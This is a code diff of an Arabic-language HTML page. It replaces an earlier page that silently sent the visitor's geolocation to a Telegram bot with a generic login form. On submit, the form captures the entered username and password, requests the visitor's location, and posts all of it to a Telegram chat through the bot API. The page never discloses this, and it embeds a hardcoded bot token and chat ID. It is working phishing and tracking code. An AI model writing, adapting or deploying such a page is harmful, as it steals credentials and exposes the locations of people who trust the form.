@@ -3,34 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال الموقع الجغرافي</title>
+    <title>نموذج تسجيل الدخول</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
             background-color: #f5f5f5;
+            padding: 20px;
         }
-        .container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        .form-container {
+            background: white;
             max-width: 500px;
             margin: 0 auto;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        #status {
-            margin-top: 20px;
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
             font-weight: bold;
         }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        #message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
         .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0088cc;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0088cc;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 20px;
+            height: 20px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -39,112 +71,131 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>جاري الحصول على موقعك الجغرافي</h1>
-        <p>يتم الآن طلب إذن الوصول إلى موقعك الجغرافي...</p>
-        <div class="loader"></div>
-        <div id="status"></div>
+    <div class="form-container">
+        <h2>تسجيل الدخول</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">اسم المستخدم:</label>
+                <input type="text" id="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">كلمة المرور:</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit" id="submitBtn">
+                <span id="btnText">تسجيل الدخول</span>
+                <span id="btnLoader" class="loader" style="display:none;"></span>
+            </button>
+        </form>
+        <div id="message"></div>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const statusElement = document.getElementById('status');
-            statusElement.textContent = 'جاري تحديد الموقع...';
+        // استبدل هذه القيم بمعلومات بوتك
+        const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+        const CHAT_ID = '7327464581';
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            if (navigator.geolocation) {
-                // استخدام watchPosition بدلاً من getCurrentPosition للحصول على أسرع استجابة
-                const watchId = navigator.geolocation.watchPosition(
-                    function(position) {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        
-                        // إيقاف مراقبة الموقع بعد الحصول عليه
-                        navigator.geolocation.clearWatch(watchId);
-                        
-                        // إرسال الموقع إلى بوت تلجرام
-                        sendToTelegramBot(latitude, longitude);
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const messageElement = document.getElementById('message');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const btnLoader = document.getElementById('btnLoader');
+            
+            // تعطيل الزر وإظهار المؤشر
+            submitBtn.disabled = true;
+            btnText.textContent = 'جاري إرسال البيانات...';
+            btnLoader.style.display = 'inline-block';
+            
+            try {
+                // الحصول على الموقع الجغرافي
+                const position = await getLocation();
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                
+                // إرسال البيانات إلى تليجرام
+                const text = `🔐 بيانات تسجيل دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n\n📍 الموقع الجغرافي:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n- رابط الخريطة: ${googleMapsLink}\n\n⏰ ${new Date().toLocaleString()}`;
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
                     },
-                    function(error) {
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                    }),
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    showMessage('تم إرسال البيانات بنجاح!', 'success');
+                } else {
+                    throw new Error(data.description || 'خطأ في الإرسال');
+                }
+            } catch (error) {
+                showMessage(`خطأ: ${error.message}`, 'error');
+                console.error('Error:', error);
+            } finally {
+                // إعادة تمكين الزر وإخفاء المؤشر
+                submitBtn.disabled = false;
+                btnText.textContent = 'تسجيل الدخول';
+                btnLoader.style.display = 'none';
+            }
+        });
+        
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('المتصفح لا يدعم خدمة الموقع الجغرافي'));
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve(position),
+                    error => {
                         let errorMessage;
                         switch(error.code) {
                             case error.PERMISSION_DENIED:
-                                errorMessage = "تم رفض طلب الوصول إلى الموقع الجغرافي.";
+                                errorMessage = "تم رفض طلب الوصول إلى الموقع الجغرافي";
                                 break;
                             case error.POSITION_UNAVAILABLE:
-                                errorMessage = "معلومات الموقع غير متاحة.";
+                                errorMessage = "معلومات الموقع غير متاحة";
                                 break;
                             case error.TIMEOUT:
-                                errorMessage = "انتهى وقت طلب الموقع.";
+                                errorMessage = "انتهى وقت طلب الموقع";
                                 break;
-                            case error.UNKNOWN_ERROR:
-                                errorMessage = "حدث خطأ غير معروف.";
-                                break;
+                            default:
+                                errorMessage = "حدث خطأ غير معروف أثناء تحديد الموقع";
                         }
-                        statusElement.textContent = errorMessage;
-                        document.querySelector('.loader').style.display = 'none';
+                        reject(new Error(errorMessage));
                     },
                     {
-                        enableHighAccuracy: true, // للحصول على دقة أعلى وأسرع
-                        maximumAge: 0, // عدم استخدام البيانات المخزنة مؤقتًا
-                        timeout: 5000 // وقت انتظار قصير
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
                     }
                 );
-            } else {
-                statusElement.textContent = "المتصفح لا يدعم خدمة الموقع الجغرافي.";
-                document.querySelector('.loader').style.display = 'none';
-            }
-        });
-
-        function sendToTelegramBot(latitude, longitude) {
-            const statusElement = document.getElementById('status');
-            statusElement.textContent = 'جاري إرسال الموقع...';
-            
-                     // استبدل هذه القيم بمعلومات بوتك
-            const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
-            const chatId = '7327464581';
-            
-            const message = `📍 تم استلام موقع جديد:
-الخط العرضي: ${latitude}
-الخط الطولي: ${longitude}
-رابط خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude}`;
-            
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            // استخدام fetch مع AbortController للتحكم في الوقت المستغرق
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 3000); // مهلة 3 ثواني
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                }),
-                signal: controller.signal
-            })
-            .then(response => response.json())
-            .then(data => {
-                clearTimeout(timeoutId);
-                document.querySelector('.loader').style.display = 'none';
-                if (data.ok) {
-                    statusElement.textContent = 'تم إرسال الموقع بنجاح! يمكنك إغلاق هذه الصفحة.';
-                } else {
-                    statusElement.textContent = 'فشل في إرسال الموقع إلى بوت تلجرام.';
-                }
-            })
-            .catch(error => {
-                clearTimeout(timeoutId);
-                document.querySelector('.loader').style.display = 'none';
-                if (error.name === 'AbortError') {
-                    statusElement.textContent = 'انتهى الوقت المخصص لإرسال الموقع.';
-                } else {
-                    statusElement.textContent = 'خطأ في الاتصال بالإنترنت.';
-                }
-                console.error('Error:', error);
             });
+        }
+        
+        function showMessage(text, type) {
+            const messageElement = document.getElementById('message');
+            messageElement.textContent = text;
+            messageElement.style.display = 'block';
+            
+            if (type === 'success') {
+                messageElement.style.backgroundColor = '#d4edda';
+                messageElement.style.color = '#155724';
+            } else {
+                messageElement.style.backgroundColor = '#f8d7da';
+                messageElement.style.color = '#721c24';
+            }
         }
     </script>
 </body>
